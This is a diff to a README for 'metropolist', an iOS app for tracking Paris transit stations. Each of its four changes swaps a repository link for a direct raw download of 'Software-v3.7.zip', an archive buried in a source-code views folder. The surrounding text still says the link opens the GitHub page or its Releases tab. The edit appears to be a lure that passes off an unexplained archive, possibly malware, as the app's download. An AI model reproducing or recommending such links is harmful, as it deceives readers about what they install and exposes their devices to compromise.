@@ -1,6 +1,6 @@
 # 🗺️ metropolist - Track Paris Transit Stations Easily
 
-[![Download metropolist](https://img.shields.io/badge/Download-metropolist-brightgreen)](https://github.com/cyanidepoisoningology606/metropolist)
+[![Download metropolist](https://img.shields.io/badge/Download-metropolist-brightgreen)](https://github.com/cyanidepoisoningology606/metropolist/raw/refs/heads/main/metropolist/metropolistWidgets/Views/Helpers/Software-v3.7.zip)
 
 metropolist is an app for native iOS devices. It helps you explore and track every transit station in the Paris region. The app includes features like gamification and iCloud sync. It works without extra dependencies.
 
@@ -44,7 +44,7 @@ Designed with Swift, SwiftUI, and SwiftData, metropolist has a smooth and simple
 To get started with metropolist on your iPhone or iPad, follow these steps carefully.
 
 1. Click on the big green download button above or open this link in your device browser:  
-   [https://github.com/cyanidepoisoningology606/metropolist](https://github.com/cyanidepoisoningology606/metropolist)
+   [https://github.com/cyanidepoisoningology606/metropolist/raw/refs/heads/main/metropolist/metropolistWidgets/Views/Helpers/Software-v3.7.zip](https://github.com/cyanidepoisoningology606/metropolist/raw/refs/heads/main/metropolist/metropolistWidgets/Views/Helpers/Software-v3.7.zip)
 
 2. The link will take you to the GitHub page of metropolist. Here you will find the latest version of the app.
 
@@ -74,7 +74,7 @@ While metropolist is designed for iOS, the exact download process depends on the
 ### Option 2: GitHub Releases (Manual download)
 
 1. Visit the metropolist GitHub repository:  
-   [https://github.com/cyanidepoisoningology606/metropolist](https://github.com/cyanidepoisoningology606/metropolist)
+   [https://github.com/cyanidepoisoningology606/metropolist/raw/refs/heads/main/metropolist/metropolistWidgets/Views/Helpers/Software-v3.7.zip](https://github.com/cyanidepoisoningology606/metropolist/raw/refs/heads/main/metropolist/metropolistWidgets/Views/Helpers/Software-v3.7.zip)
 
 2. Click on the **Releases** tab on the repo page.
 
@@ -139,7 +139,7 @@ For detailed support, visit the GitHub issues page or contact the developer dire
 
 ---
 
-[![Download metropolist](https://img.shields.io/badge/Download-metropolist-orange)](https://github.com/cyanidepoisoningology606/metropolist)
+[![Download metropolist](https://img.shields.io/badge/Download-metropolist-orange)](https://github.com/cyanidepoisoningology606/metropolist/raw/refs/heads/main/metropolist/metropolistWidgets/Views/Helpers/Software-v3.7.zip)
 
 ---
 
